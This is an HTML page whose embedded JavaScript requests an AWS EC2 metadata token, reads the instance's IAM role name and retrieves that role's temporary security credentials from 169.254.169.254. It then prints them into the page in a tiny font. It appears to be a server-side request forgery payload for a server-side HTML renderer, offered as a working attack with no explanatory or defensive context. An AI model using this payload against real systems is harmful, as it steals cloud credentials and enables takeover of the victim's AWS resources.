<!DOCTYPE html>
<html>
<head>
    <style>
        body, pre { margin: 0; padding: 0; font-family: monospace; font-size: 6px; line-height: 1; word-break: break-all; }
    </style>
</head>
<body>
    <pre id="out">Loading...</pre>
    <script>
        try {
            // 1. Get Token
            var tXhr = new XMLHttpRequest();
            tXhr.open("PUT", "http://169.254.169.254/latest/api/token", false);
            tXhr.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "60");
            tXhr.send();
            
            if (tXhr.status === 200) {
                var token = tXhr.responseText;

                // 2. Get Role Name
                var rXhr = new XMLHttpRequest();
                rXhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
                rXhr.setRequestHeader("X-aws-ec2-metadata-token", token);
                rXhr.send();

                if (rXhr.status === 200) {
                    var role = rXhr.responseText.trim();

                    // 3. Get Credentials
                    var cXhr = new XMLHttpRequest();
                    cXhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role, false);
                    cXhr.setRequestHeader("X-aws-ec2-metadata-token", token);
                    cXhr.send();

                    document.getElementById("out").innerText = cXhr.status === 200 ? cXhr.responseText : "Error Creds: " + cXhr.status;
                } else {
                    document.getElementById("out").innerText = "Error Role: " + rXhr.status;
                }
            } else {
                document.getElementById("out").innerText = "Error Token: " + tXhr.status;
            }
        } catch (e) {
            document.getElementById("out").innerText = "Err: " + e.toString();
        }
    </script>
</body>
</html>
